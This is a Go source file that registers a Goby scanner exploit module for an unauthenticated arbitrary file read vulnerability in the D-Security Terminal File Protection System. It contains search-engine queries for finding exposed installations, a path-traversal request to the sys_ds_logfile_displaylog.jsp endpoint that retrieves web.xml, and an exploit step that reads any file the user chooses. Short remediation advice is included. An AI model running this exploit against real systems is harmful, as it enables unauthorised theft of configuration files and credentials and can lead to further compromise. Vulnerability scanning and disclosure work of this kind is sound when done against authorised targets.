package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "D-Security Terminal File Protection System /DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp File Read Vulnerability",
    "Description": "<p>D-Security Terminal File Protection System is a solution focused on enterprise file management efficiency and security. The system performs full-text encryption of files, reducing the risk of being cracked, and has been recognized as a secure file encryption product by government and intelligence agencies. A file read vulnerability exists in the /DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp interface, allowing attackers to construct malicious requests to read arbitrary files in the system (e.g., database configuration files, system configuration files), potentially leading to sensitive information disclosure and further compromising system security.</p>",
    "Product": "D-Security Terminal File Protection System",
    "Homepage": "https://www.secudocx.com/d-security/",
    "DisclosureDate": "2025-01-07",
    "PostTime": "2025-01-08",
    "Author": "1251220046@qq.com",
    "FofaQuery": "(body=\"D-Security\" || body=\"WNJsoft\") && body=\"/DLP/\"",
    "GobyQuery": "(body=\"D-Security\" || body=\"WNJsoft\") && body=\"/DLP/\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows unauthenticated attackers to read arbitrary files in the system, potentially leading to sensitive information disclosure, system configuration exposure, and further severe consequences such as data leakage and system compromise.</p>",
    "Recommendation": "<p>1. Disable related services exposed to the internet.</p><p>2. Set interface access permissions to restrict unauthorized access.</p><p>3. Upgrade the system to the secure version provided by the vendor.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/144994498?spm=1001.2014.3001.5501"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "web.xml",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "web.xml",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp?logType=tomcat&logFileName=../../../../../../D-Security/webapps/DLPWebApps/WEB-INF/web.xml",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<web-app",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp?logType=tomcat&logFileName=../../../../../../D-Security/webapps/DLPWebApps/WEB-INF/{{{filePath}}}",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "D-Security终端文件保护系统 /DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp 文件读取漏洞",
            "Product": "D-Security终端文件保护系统",
            "Description": "<p>D-Security终端文件保护系统是一款专注于企业文件管理效率与安全的解决方案。该系统对文件进行全文加密，降低了被破解的风险，并被政府和国安局等情报单位认定为安全文件加密产品。系统的 /DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp 接口存在文件读取漏洞，攻击者可以通过构造恶意请求读取系统中的任意文件（如数据库配置文件、系统配置文件等），可能导致敏感信息泄露，进一步危害系统安全。</p>",
            "Recommendation": "<p>1. 关闭暴露在互联网的相关服务接口。</p><p>2. 设置接口访问权限以限制未经授权的访问。</p><p>3. 升级系统至厂商提供的安全版本。</p>",
            "Impact": "<p>该漏洞允许未经身份验证的攻击者读取系统中的任意文件，可能导致敏感信息泄露、系统配置暴露，进一步引发数据泄露和系统被攻陷等严重后果。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "D-Security Terminal File Protection System /DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp File Read Vulnerability",
            "Product": "D-Security Terminal File Protection System",
            "Description": "<p>D-Security Terminal File Protection System is a solution focused on enterprise file management efficiency and security. The system performs full-text encryption of files, reducing the risk of being cracked, and has been recognized as a secure file encryption product by government and intelligence agencies. A file read vulnerability exists in the /DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp interface, allowing attackers to construct malicious requests to read arbitrary files in the system (e.g., database configuration files, system configuration files), potentially leading to sensitive information disclosure and further compromising system security.</p>",
            "Recommendation": "<p>1. Disable related services exposed to the internet.</p><p>2. Set interface access permissions to restrict unauthorized access.</p><p>3. Upgrade the system to the secure version provided by the vendor.</p>",
            "Impact": "<p>This vulnerability allows unauthenticated attackers to read arbitrary files in the system, potentially leading to sensitive information disclosure, system configuration exposure, and further severe consequences such as data leakage and system compromise.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}"
    },
    "VariablesOrder": [
        "filePath"
    ],
    "EditType": "fast",
    "PocId": "9982"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}